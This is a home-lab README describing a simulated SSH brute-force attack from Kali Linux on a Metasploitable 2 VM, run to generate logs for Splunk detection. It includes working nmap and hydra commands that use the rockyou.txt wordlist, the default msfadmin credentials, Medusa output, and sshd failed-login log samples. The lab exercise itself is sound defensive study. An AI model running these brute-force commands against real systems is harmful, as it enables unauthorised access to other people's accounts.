# 🔓 SSH Brute-Force Attack Scenario

This scenario simulates a brute-force SSH attack from Kali Linux against a vulnerable Metasploitable 2 target. It's used to generate logs, test Splunk detection, and understand attack behavior.

## 🎯 Target
- IP: `192.168.x.x` (Metasploitable VM)
- Service: OpenSSH
- Port: 22
- Default creds: `msfadmin:msfadmin`

## 🛠️ Tools Used
- `hydra`
- `nmap`
- `wireshark` or `tcpdump` (optional)

## 🔍 Steps
1. Confirm SSH is open:
   ```bash
   nmap -p 22 192.168.x.x
   ```

2. Launch brute-force attack with Hydra:
   ```bash
   hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.x.x
   ```

3. Monitor logs or traffic with:
   ```bash
   wireshark
   ```

## 📝 Notes
- Successful brute-force attempt should be visible in:
  - Splunk SSH logs
  - Wireshark TCP streams
  - Metasploitable's `/var/log/auth.log` (if accessible)

## 🧠 Learning Points
- Observe timing, connection attempts, and delays
- Analyze how brute-force behavior appears in logs
- Use data for detection rules or alerts in Splunk
  
---

## 📸 Brute-Force Output & Logs

### ✅ Medusa Output

```
ACCOUNT CHECK: [ssh] Host: 192.168.68.59 (1 of 1, 0 complete)
Password: kenken (2297 of 14344391 complete)
Password: skyblue (2305 of 14344391 complete)
...
```

*Medusa cycling through passwords from rockyou.txt*

### 🔒 Metasploitable Log Sample

```
sshd[5960]: Failed password for msfadmin from 192.168.68.58 port 38605 ssh2
sshd[5961]: Failed password for msfadmin from 192.168.68.58 port 38612 ssh2
sshd[5962]: Failed password for msfadmin from 192.168.68.58 port 38618 ssh2
```

*Metasploitable showing failed SSH login attempts from Kali*

---

### 🖼️ Screenshot

![Brute-force demo](medusa-ssh-brute.png)

*A full view of Kali attacking while Metasploitable logs real-time SSH failures*
